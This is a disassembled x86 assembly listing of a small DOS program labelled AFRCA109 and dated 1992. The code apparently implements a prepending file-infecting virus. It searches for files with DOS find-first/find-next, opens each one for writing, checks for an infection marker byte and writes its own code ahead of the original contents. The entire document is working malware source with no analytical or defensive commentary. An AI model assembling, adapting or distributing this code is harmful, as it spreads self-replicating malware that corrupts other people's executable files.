
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        AFRCA109			         лл
;лл								         лл
;лл      Created:   16-Sep-92					         лл
;лл      Passes:    5	       Analysis Options on: AW		         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

data_2e		equ	4F43h
data_3e		equ	0FE00h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

afrca109	proc	far

start:
		mov	si,100h
		push	si
		mov	ax,cs
		add	ah,10h
		mov	es,ax
		xor	di,di			; Zero register
		mov	cx,6Dh
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	dx,data_3e
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	dx,167h
		mov	ah,4Eh			; 'N'
		jmp	short loc_2
loc_1:
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ah,4Fh			; 'O'
loc_2:
		push	cs
		pop	ds
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		mov	cx,0FE1Eh
		jc	loc_3			; Jump if carry Set
		mov	dx,cx
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx
		push	es
		pop	ds
		mov	dx,di
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		add	ax,6Dh
		cmp	byte ptr [di],0BEh
		je	loc_1			; Jump if equal
		push	ax
		xor	cx,cx			; Zero register
		mov	ax,4200h
		cwd				; Word to double word
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		pop	cx
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		jmp	short loc_1
loc_3:
		push	cs
		pop	es
		mov	bl,0FCh
		mov	word ptr [bx],0AAACh
		mov	word ptr [bx+2],0FCE2h
		pop	di
		push	bx
		retn
		sub	ch,ds:data_2e
		dec	bp
		add	bl,al

afrca109	endp

seg_a		ends



		end	start
